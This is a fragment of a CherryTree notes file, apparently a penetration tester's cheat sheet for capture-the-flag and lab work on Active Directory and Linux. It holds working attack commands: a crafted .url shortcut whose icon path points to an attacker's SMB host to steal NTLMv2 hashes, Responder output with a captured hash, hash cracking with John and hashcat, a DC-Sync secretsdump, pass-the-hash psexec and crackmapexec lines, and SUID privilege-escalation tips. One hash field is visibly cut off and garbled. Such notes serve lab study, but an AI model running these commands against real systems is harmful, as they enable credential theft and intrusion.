          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat @hax.url &#13;
[InternetShortcut]&#13;
URL=anything&#13;
WorkingDirectory=anything&#13;
IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
IconIndex=1</codebox>
          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ sudo responder -I tun0 -v&#13;
...&#13;
[+] Listening for events...&#13;
...</codebox>
          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
smb: \&gt; put @hax.url &#13;
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
smb: \&gt; quit&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$&#13;

&#13;After a little while, responder captures a hash.
&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1ccodebox>
          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat hash.txt &#13;
anirudh::VAULT:9def1316e1c
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
Using default input encoding: UTF-8&#13;
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
Will run 4 OpenMP threads&#13;
Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
SecureHM         (anirudh)     &#13;
1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
Session completed. </codebox>
        </node>
        <node name="Powerview" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696729392" ts_lastsave="1696730835">
          <rich_text>USing powerview

Download it:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Start power shell first:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Usage:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

To start PowerView

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

ref: </rich_text>
          <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/">https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/</rich_text>
          <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</codebox>
          <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe</codebox>
          <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
          <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
        </node>
        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146362">
          <rich_text>check the Forest writeup for priv esc

</rich_text>
          <rich_text link="webs https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough">https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
          <rich_text>



PS:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u get the hash use it
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.10.10.100</codebox>
          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.100 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
          <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 10.10.10.100
   ☐  nmap -sL 10.10.10.100
   ☐  nbtscan -r 10.10.10.100

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 10.10.10.100
   ☐  nmap -sU 10.10.10.100
</rich_text>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.10.10.100</codebox>
        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.10.10.100'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.10.10.100</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1687689975">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
    </node>
  </node>
</cherrytree>
